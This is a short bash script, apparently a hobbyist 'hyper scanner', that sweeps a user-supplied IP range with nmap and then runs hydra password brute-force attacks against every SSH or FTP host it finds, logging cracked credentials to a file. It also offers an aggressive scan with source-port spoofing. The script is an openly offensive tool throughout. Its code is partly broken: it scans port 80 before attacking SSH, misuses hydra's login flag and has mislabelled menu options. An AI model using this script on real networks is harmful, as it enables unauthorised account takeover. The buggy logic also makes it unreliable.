#!/bin/bash
#author :Ashwin vinod

#function declartions
ssh (){
  #statements

echo " [*] Enter ip block"
read ip
echo " [*] starting nmap scan"
unset IFS
data=$(nmap -p 80 -Pn -oG - $ip |awk '/open/{print $2 " " } END {IFS ="\n"}')
datcnt=( $data )
echo $datcnt
#attack section
echo " [*] nmap scan completed "
echo " [*] $data is up"
 if [ -z "$data" ]; then
   echo "[*] host is down"
 else
   echo " [*] starting to attack $data"
 fi
   for (( i = 0; a < 1;i++ )); do
     #statements
     if [ -z "${datcnt[i]}" ]; then
       a=1
       echo " [*] Crack complete"
     else
 hydra -l crackuser.txt  -t 4 -P crackpass.txt -o found.txt ssh://${datcnt[i]}
fi
done
   }
   ftp(){
     echo " [*] Enter ip block"
     read ip
     echo "starting nmap scan"
     data=$(nmap -p 21 -Pn -oG - $ip |awk '/open/{print $2 " " }')
     echo "nmap scan completed "
     echo "$data is up"
      if [ -z "$data" ]; then
        echo "host is down"

      else
        echo "starting to attack $data"
       hydra -l crackuser.txt  -t 4 -P crackpass.txt -o found.txt ftp://$data
      fi
   }
   scan(){
     echo " [*] Enter ip block"
     read ip
     echo "Starting NMAP scan"
     data=$(sudo nmap -sS -sU -T4 -A -v -sV -g 53 $ip )
     echo $data
   }
  tput clear
#main part
 echo -e "\e[0;33mWelcome to hyper scanner\033[0m "
 echo -e "\e[1;41;105mIT IS RECOMMENDED TO USE THIS SCRIPT AS SUDO\033[0m "
 echo "what do u want to do "
 echo -e "\e[1m[0fi]nmap scan"
 echo -e "[1]NMAP ssh scan  plus ssh brute force"
 echo -e "[1]NMAP ftp scan  plus ftp brute force\033[0m"
 read opt
 # option selecting
 case "$opt" in
   "1")ssh
     ;;
   "0")scan
     ;;
    "2")ftp
    ;;
 esac
